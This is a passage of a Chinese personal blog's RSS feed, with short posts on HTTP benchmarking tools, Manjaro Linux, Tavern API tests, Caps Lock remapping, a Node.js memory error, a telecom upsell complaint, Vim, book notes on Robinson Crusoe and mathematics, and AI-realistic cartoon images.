&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;缺点
&lt;ul&gt;
&lt;li&gt;不支持指定测试时长&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;安装&#34;&gt;安装&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# debian/ubuntu&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apt-get install apache2-utils
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# centos&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;yum -y install httpd-tools
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;wrk&#34;&gt;wrk&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/wg/wrk&#34;&gt;https://github.com/wg/wrk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;C语言&lt;/li&gt;
&lt;li&gt;优点
&lt;ul&gt;
&lt;li&gt;支持lua脚本&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;wrk is a modern HTTP benchmarking tool capable of generating significant load when run on a single multi-core CPU. It combines a multithreaded design with scalable event notification systems such as epoll and kqueue.
An optional LuaJIT script can perform HTTP request generation, response processing, and custom reporting. Details are available in SCRIPTING and several examples are located in scripts/.&lt;/p&gt;</description>
    </item>
    <item>
      <title>又发现了一个宝藏linux发行版 manjaro</title>
      <link>https://wdd.js.org/posts/2021/05/cntrwh/</link>
      <pubDate>Sun, 30 May 2021 13:42:36 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/cntrwh/</guid>
      <description>&lt;h1 id=&#34;overview&#34;&gt;overview&lt;/h1&gt;
&lt;p&gt;我主要使用过4个操纵系统。windows,macos,ubuntu,manjaro，每个操作系统，我都有上年或者上月的使用体会。&lt;/p&gt;
&lt;p&gt;如果你是普通用户，无论工作还是学习，都不涉及到写代码的话。windows和mac是最好的选择，如果你是一名开发人员，那么macos,ubuntu和manjaro都是可以选择的。&lt;/p&gt;
&lt;p&gt;我是一个很容易接受操切换作系统改变的人，从每个系统上我都可以很顺畅的切换。但是并不是所有人都是如此，有些人即使用了一年多的mac，还是无法接受，最终又换回了windows。&lt;/p&gt;
&lt;h1 id=&#34;changelog&#34;&gt;changelog&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;大学到工作第一年，我一直用windows，满足各种需求&lt;/li&gt;
&lt;li&gt;工作第二年，我换了mac。因为我想轻便的笔记本，另外也想尝尝鲜。mac的屏幕、界面UI、触摸板都是值得称道的地方，键盘体验就不足人意了。&lt;/li&gt;
&lt;li&gt;从mac切换到ubuntu, macbook使用接近4年了。明显感觉到一些性能上的不足，刚好又发现一台空闲的台式机没人用，台式机性能不错，之前是做服务器的，CPU、内存、磁盘资源都比较丰富。然后我就在上面安装了ubuntu。系统的初始化软件安装有些折腾人，要安装中文输入法，常见的软件例如微信和QQ, 安装还是有些难度的。ubuntu刚开始使用还是比较流畅的，但是接下来遇到非常致命的问题，UI经常卡死。查下来发现和Xorg以及系统的显卡有关，网上搜了下，很多人遇到类似的问题，也尝试了一些解决方案，但是还是无法解决。索性我就关了ubuntu的图形界面，仅仅ssh远程开发。&lt;/li&gt;
&lt;li&gt;从ubuntu切换到macos, 恢复到之前的状态，感觉很好。但是看到macbook pro上接的扩展坞，以及被各种线缆高的乱糟糟的桌面，想尝试其他Linux发行版的想法又在心里悄悄发了芽，一路疯长。&lt;/li&gt;
&lt;li&gt;道除了ubuntu, 就没有其他选择了吗？调研一番，发现了manjaro这个发行版，用户评价很不错。然后我就试试看，结果发现安装各种软件比ubuntu方便多了，试用了几天，也是越来越喜欢。又发现了一个宝藏发行版。&lt;/li&gt;
&lt;li&gt;其实我一直对manjaro这个单词又很大的好奇，这个英文名是什么意思呢？词典上没有对这个英文词的介绍，只是说是一个linux发行版。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;manjaro-什么意思如何发音&#34;&gt;manjaro 什么意思？如何发音？&lt;/h1&gt;
&lt;p&gt;marjaro这个词来自kilimanjaro,  乞力马扎罗是非洲最高的高山，这座山是由于火山爆发所产生的，这个可能比较贴合marjaro的滚动发布的特点，也说明这个发行版是比较活跃的吧。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Although the inspiration for the name originates from &lt;em&gt;Mount Kili&lt;strong&gt;manjaro&lt;/strong&gt;&lt;/em&gt;, it may be pronounced as &amp;lsquo;Man-jar-o&amp;rsquo; or as &amp;lsquo;Man-ha-ro&amp;rsquo;.   &lt;a href=&#34;https://wiki.manjaro.org/index.php/Manjaro_FAQ&#34;&gt;https://wiki.manjaro.org/index.php/Manjaro_FAQ&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;乞力马扎罗山&lt;/strong&gt;（斯瓦西里语：Kilimanjaro，意为“灿烂发光的山”）位于坦桑尼亚东北的乞力马扎罗区，临近肯尼亚边界，是非洲的最高山，常被称为“非洲屋脊”、“非洲之王”。其最高峰为基博峰（也称乌呼鲁峰），海拔5895米。&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;manjaro发行版的特点&#34;&gt;manjaro发行版的特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;图形化安装界面，非常方便&lt;/li&gt;
&lt;li&gt;自带图形界面&lt;/li&gt;
&lt;li&gt;自动硬件检测，图形化支持做的比ubuntu好太多&lt;/li&gt;
&lt;li&gt;滚动更新&lt;/li&gt;
&lt;li&gt;非常多的包，可以使用AUR来安装包&lt;/li&gt;
&lt;li&gt;相比与Arch, manjaro对新手非常友好&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://manjaro.org/terms-of-use/&#34;&gt;https://manjaro.org/terms-of-use/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Developed in Austria, France, and Germany, Manjaro provides all the benefits of the Arch operating system combined with a focus on &lt;em&gt;user-friendliness&lt;/em&gt; and &lt;em&gt;accessibility&lt;/em&gt;.   &lt;a href=&#34;https://wiki.manjaro.org/index.php/About_Manjaro&#34;&gt;https://wiki.manjaro.org/index.php/About_Manjaro&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>tavern</title>
      <link>https://wdd.js.org/posts/2021/05/xneq08/</link>
      <pubDate>Wed, 26 May 2021 15:46:03 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/xneq08/</guid>
      <description>&lt;h1 id=&#34;获取环境变量&#34;&gt;获取环境变量&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; Authorization: &amp;#34;Basic {tavern.env_vars.SECRET_CI_COMMIT_AUTH}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;x-www-form-urlencoded&#34;&gt;x-www-form-urlencoded&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;request&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;url&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{test_host}/form_data&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;method&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;POST&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;data&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;id&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;abc123&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;按照name过滤运行测试--k&#34;&gt;按照name过滤运行测试 -k&lt;/h1&gt;
&lt;p&gt;This can then be selected with the -k flag to pytest - e.g. pass pytest-kfake to run all tests with ‘fake’ in the name.&lt;/p&gt;
&lt;p&gt;比如只运行名称包含fake的测试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yaml&#34; data-lang=&#34;yaml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;py.test -k fake&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>大写锁定键映射为escape</title>
      <link>https://wdd.js.org/posts/2021/05/eafyk8/</link>
      <pubDate>Mon, 24 May 2021 20:25:34 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/eafyk8/</guid>
      <description>&lt;p&gt;大写锁定键一般都是非常鸡肋的功能。&lt;/p&gt;
&lt;h1 id=&#34;仅仅一次生效&#34;&gt;仅仅一次生效&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; setxkbmap -option caps:escape  大写锁定键改为esc
 
 setxkbmap -option ctrl:nocaps  大写锁定键改为ctrl
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;永久生效&#34;&gt;永久生效&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;/etc/X11/xorg.conf.d/90-custom-kbd.conf&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Section &amp;#34;InputClass&amp;#34;
    Identifier &amp;#34;keyboard defaults&amp;#34;
    MatchIsKeyboard &amp;#34;on&amp;#34;

    Option &amp;#34;XKbOptions&amp;#34; &amp;#34;caps:escape&amp;#34;
EndSection
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注销或者重启后生效&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://superuser.com/questions/566871/how-to-map-the-caps-lock-key-to-escape-key-in-arch-linux&#34;&gt;https://superuser.com/questions/566871/how-to-map-the-caps-lock-key-to-escape-key-in-arch-linux&lt;/a&gt;&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;https://wiki.archlinux.org/title/X_keyboard_extension&#34;&gt;https://wiki.archlinux.org/title/X_keyboard_extension&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>牛津通识读本：数学（中文版）笔记</title>
      <link>https://wdd.js.org/posts/2021/05/wsoivr/</link>
      <pubDate>Mon, 24 May 2021 13:19:39 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/wsoivr/</guid>
      <description>&lt;p&gt;笔记本导出&lt;!-- raw HTML omitted --&gt;牛津通识读本：数学（中文版）&lt;!-- raw HTML omitted --&gt;蒂莫西·高尔斯&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;第二章 数与抽象&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 483&lt;!-- raw HTML omitted --&gt;重要的只是它们所遵循的规则。&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 486&lt;!-- raw HTML omitted --&gt;我们通过接受 i作出小小的投资，结果得到了许多倍的回报。&lt;/p&gt;</description>
    </item>
    <item>
      <title>鲁滨逊漂流记 笔记与读后感</title>
      <link>https://wdd.js.org/posts/2021/05/uvq06k/</link>
      <pubDate>Sun, 23 May 2021 21:13:51 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/uvq06k/</guid>
      <description>&lt;p&gt;第一章 人生的起点&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 44&lt;!-- raw HTML omitted --&gt;他对我说，只有那些穷到走投无路，或心怀大志的巨富，才会选择出海冒险，想让自己以非凡的事业扬名于世。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;走投无路的穷人剩下的只是作为动物的本能，怎么可能和心怀大志的巨富相提并论呢&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;标注(黄色) - 位置 194&lt;!-- raw HTML omitted --&gt;在去伦敦的路上，以及到了伦敦以后，我内心一直剧烈挣扎，我到底该选什么样的人生道路，我该回家还是该航海？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;我相信，每个人都有面对人生道路的艰难抉择的时候。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;第三章 荒岛遇难&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 621&lt;!-- raw HTML omitted --&gt;“因为突来的欣喜，如同突来的悲伤，都令人难以承受。”&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;悲伤与快乐都是来自比较。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;第六章 生病以及良心有愧&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1193&lt;!-- raw HTML omitted --&gt;大麦刚刚长出来的时候，我曾深受感动，第一次认为那是上帝显示的神迹。不过后来发现那不是神迹以后，所有从它而来的感动就随之消失了。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;无法解释的时候，才会想到鬼神。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;第九章 小船&lt;!-- raw HTML omitted --&gt;标注(黄色) - 位置 1701&lt;!-- raw HTML omitted --&gt;我认为，我们之所以感到缺乏和不满足，是因为我们对已经拥有的东西缺少感恩之心。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;看到苹果又出了新手机，macbook pro又出了新款的m1笔记本，对比我本自己目前手中所拥有的东西，你真的珍惜过吗？
得不到的永远在骚动 &amp;ndash;《红玫瑰》&lt;/p&gt;</description>
    </item>
    <item>
      <title>Fatal process OOM in insufficient memory to create an Isolate</title>
      <link>https://wdd.js.org/fe/oom-in-insufficient-memory/</link>
      <pubDate>Fri, 21 May 2021 12:01:00 +0800</pubDate>
      <guid>https://wdd.js.org/fe/oom-in-insufficient-memory/</guid>
      <description>&lt;p&gt;环境： ARM64&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;--- Last few GCs ---&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;lt;--- JS stacktrace ---&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Fatal process OOM in insufficient memory to create an Isolate&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在Dockerfile上设置&lt;strong&gt;max-old-space-size&lt;/strong&gt;的node.js启动参数， 亲测有效。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;CMD node --report-on-fatalerror --max-old-space-size&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1536&lt;/span&gt; dist/index.js
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;Currently, by default v8 has a memory limit of 512mb on 32-bit and 1gb on 64-bit systems. You can raise the limit by setting &amp;ndash;max-old-space-size to a maximum of ~1gb for 32-bit and ~1.7gb for 64-bit systems. But it is recommended to split your single process into several workers if you are hitting memory limits.&lt;/p&gt;</description>
    </item>
    <item>
      <title>官方客服也开始割韭菜</title>
      <link>https://wdd.js.org/posts/2021/05/ae2rme/</link>
      <pubDate>Thu, 20 May 2021 13:31:36 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/ae2rme/</guid>
      <description>&lt;p&gt;联通官方客服已经开始割韭菜了。&lt;/p&gt;
&lt;p&gt;前两天10010给我打电话，一个女客服操着浓重的口音，兴奋的给说我是优质客户，然后因为回馈老用户的关系，每个月会多送我2个G的5G高速流量。&lt;/p&gt;
&lt;p&gt;我当时很警觉，立马问她这个会对我原来的套餐有影响吗，她说没任何影响，接着殷切的问我要不要办理。我思考了一下，觉得不用花钱，又多了2个G的流量，索性就办理了。&lt;/p&gt;
&lt;p&gt;今天我在联通掌上营业厅上查自己的实时话费，突然多出了一项9元的流量叠加包月套餐费。的确对我原来的套餐没有影响，只是多了一个新的业务。😂&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/ae2rme/2022-10-29-19-35-36.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;我思来想去，我应该没有办理这个套餐啊？哪里冒出来的。然后仔细的从迷宫似的掌上营业厅上查找套餐信息。结果给我找到了下面的信息。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/ae2rme/2022-10-29-19-35-48.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;我当时很生气&lt;/strong&gt;，当时客服给我介绍流量包的时候，从始至终没有提这个流量包要收费的事情。&lt;strong&gt;我也是大意了，没有闪。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/ae2rme/2022-10-29-19-36-06.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;接着我就打了10010的官方客服，然后走人工投诉，最终取消了这个套餐。&lt;/p&gt;
&lt;p&gt;我想，这种电话应该很多人都接过吧，被骗的应该不只是少数，如果不仔细看自己的账单，我也不知道有这件事情。&lt;/p&gt;
&lt;p&gt;从这件事事情我也反省自己：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;官方客服也不要信&lt;/li&gt;
&lt;li&gt;客服说的话，都要当作放屁&lt;/li&gt;
&lt;li&gt;没有看到黑纸白字的承诺，都是骗人的&lt;/li&gt;
&lt;li&gt;不要想贪小便宜，否则自己就会被当作韭菜&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/ae2rme/2022-10-29-19-36-20.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>让你放弃VIM的一些原因</title>
      <link>https://wdd.js.org/vim/why-you-leave-vim/</link>
      <pubDate>Tue, 18 May 2021 11:30:22 +0800</pubDate>
      <guid>https://wdd.js.org/vim/why-you-leave-vim/</guid>
      <description>&lt;p&gt;我只使用VIM作为主力开发工具，已经快到200天了。聊聊这其中的一些感受。&lt;/p&gt;
&lt;p&gt;对大部分来说，提到文本编辑器，我们可能会想到word, nodepad++, webstorm, sublime, vscode。&lt;/p&gt;
&lt;p&gt;这些GUI工具在给我们提供便利性的同时，也在逐渐固化我们对于编辑器的认知与思维方式。&lt;/p&gt;
&lt;p&gt;闭上眼睛，提到编辑器，你脑海里想到的界面是什么呢？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;左边一个文件浏览窗口&lt;/li&gt;
&lt;li&gt;右边一个多标签页的文件编辑窗口&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;陌生感&#34;&gt;陌生感&lt;/h1&gt;
&lt;p&gt;想象一下，我们在使用编辑器的时候，哪些动作做的最多&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;鼠标移动到文件浏览窗口，通过滚轮的滚动，来选择文件，单击之后，打开一个文件。但是在VIM上，完全没有这种操作。&lt;/li&gt;
&lt;li&gt;GUI下可以同时打开多个文件，进行编辑。但是很多人觉得VIM只能打开一个文件，甚至想打开另一个文件的时候，先要退出VIM。即使打开了多个文件，也不知道这些文件要如何切换。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;但是当你刚开始使用VIM的时候，可能并没有安装什么插件，这时候你会有以下的一些困惑&lt;/p&gt;
&lt;p&gt;你用VIM打开一个文件后，怎么再打开一个文件呢？因为默认的VIM是没有文件浏览窗口的。你在GUI模式下养成的经验，在VIM上完全无法使用。你可能甚至不知道要怎么退出VIM。所有的一切都那么陌生。&lt;/p&gt;
&lt;h1 id=&#34;虚无感&#34;&gt;虚无感&lt;/h1&gt;
&lt;p&gt;VIM一般都运行在终端之上，给人感觉云里雾里，虚无缥缈。而编辑器就不同了，你看到的文件夹，打开的文件，对你来说就像是身上穿的衣服，手里搬的砖。终端呢，黑乎乎的，没啥颜色与图标，看起来那么不切实际，仿佛是天边的云彩，千变万化，无法琢磨。&lt;/p&gt;
&lt;h1 id=&#34;恐惧感&#34;&gt;恐惧感&lt;/h1&gt;
&lt;p&gt;很多人可能做过那种梦，就是在梦里感觉自己在自由落体，然后惊醒。在你使用VIM的时候，可能也会有这种感觉。例如，一个文件我写了几百行了，万一ssh远程连接断了，或者说终端崩溃了，我写的文件会不会丢呢？为了安全起见，还是不用VIM吧。&lt;/p&gt;
&lt;h1 id=&#34;挫折感&#34;&gt;挫折感&lt;/h1&gt;
&lt;p&gt;使用VIM的时候，你必然要经历过很多困难，这些困难让你感觉到挫折，失去了继续学习的欲望。内心的另外一个人可能会说，我只想安安静静地做一个写代码的美男子，为什么要折腾这毫无颜值、难用的VIM呢？&lt;/p&gt;</description>
    </item>
    <item>
      <title>再读鲁滨逊漂流记: 成年人如何面对孤独</title>
      <link>https://wdd.js.org/posts/2021/05/vzfo04/</link>
      <pubDate>Mon, 17 May 2021 18:23:41 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/vzfo04/</guid>
      <description>&lt;p&gt;初中的时候，我曾经读过鲁滨逊漂流记，那时候这本书中最吸引我的是各种新奇的冒险体验，鲁滨逊接下来会遇到什么事情，是我最关注的事情。&lt;/p&gt;
&lt;p&gt;最近，我又开始读这本书了。是因为我感觉到很孤独，我不知道如何解决。我想，鲁滨逊一个人在一个荒岛上过了二十八年，他是如何面对孤独的呢？我想找到这个答案。&lt;/p&gt;
&lt;h1 id=&#34;写日记&#34;&gt;写日记&lt;/h1&gt;
&lt;p&gt;小说中有不少的章节，都是鲁滨逊的日记。记录了他每天的工作和经历，通过写日志，他仿佛能够与自己对话。所以，有时候当我感到孤独的时候，我也写日记，把我的感想，我的困惑和烦恼统统写出来。对我自己来说，这也是一种释放。&lt;/p&gt;
&lt;h1 id=&#34;投身工作制造产品让自己忙活&#34;&gt;投身工作，制造产品，让自己忙活&lt;/h1&gt;
&lt;p&gt;除非生病或者下雨，鲁兵逊总是在不停的忙活着。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;收集葡萄，晒葡萄干&lt;/li&gt;
&lt;li&gt;圈养小羊，让自己有充足的肉可以吃&lt;/li&gt;
&lt;li&gt;种植大麦，自己制作面包&lt;/li&gt;
&lt;li&gt;加固自己的房子&lt;/li&gt;
&lt;li&gt;晒制陶土，制作陶器&lt;/li&gt;
&lt;li&gt;环岛旅行&lt;/li&gt;
&lt;li&gt;&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;鲁滨逊每天都在忙活着，每一天过得都非常有意义。我也觉得自己决不能浪费时间。&lt;/p&gt;
&lt;h1 id=&#34;找到自己的信仰&#34;&gt;找到自己的信仰&lt;/h1&gt;
&lt;p&gt;鲁滨逊在一次生病过程中，身体非常虚弱，当他回忆往事的时候，总觉得自己是个罪恶的人，无法得到谅解。但是偶然他得到一本《圣经》，他阅读圣经，从中找到自己的信仰。有信仰是非常幸福的事情，但是你若问我我的信仰是什么，我也不知道我的信仰是什么。&lt;/p&gt;
&lt;p&gt;这是最好的时代，也是最坏的时代。所有的人都觉得90后是压力最大的一代，90都神经也是最敏感的（腾讯张军的致敬青年，白岩松的“不会吧”）。我们承受着各种压力，其中最大的可能就是房价了。&lt;/p&gt;
&lt;p&gt;人生当中，自由自在可能仅仅是片刻的，承受压力却是主旋律。但是如何面对压力，却把人分成了不同的样子。有的人会被压力击垮，放弃抵抗，沉醉于各种网络精神鸦片中，有的人却能负重前行，坚持学习，一往无前。&lt;/p&gt;
&lt;p&gt;罗曼罗兰说过：这世上只有一种真正的英雄主义，就是认清生活的真相，并且任然热爱她。&lt;/p&gt;</description>
    </item>
    <item>
      <title>使用AI让卡通人物更加真实</title>
      <link>https://wdd.js.org/posts/2021/05/mfh46t/</link>
      <pubDate>Fri, 14 May 2021 13:49:09 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2021/05/mfh46t/</guid>
      <description>&lt;h1 id=&#34;魔女宅急便-琪琪&#34;&gt;魔女宅急便 琪琪&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-16-39.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;有点像花木兰&#34;&gt;有点像花木兰&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-16-46.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;佐助&#34;&gt;佐助&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-16-52.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;不认识&#34;&gt;不认识&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-16-58.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;小樱&#34;&gt;小樱&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-17-04.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;不认识-1&#34;&gt;不认识&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-17-10.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;不认识-2&#34;&gt;不认识&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-17-17.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;不认识-3&#34;&gt;不认识&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/posts/2021/05/mfh46t/2022-10-29-20-17-25.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
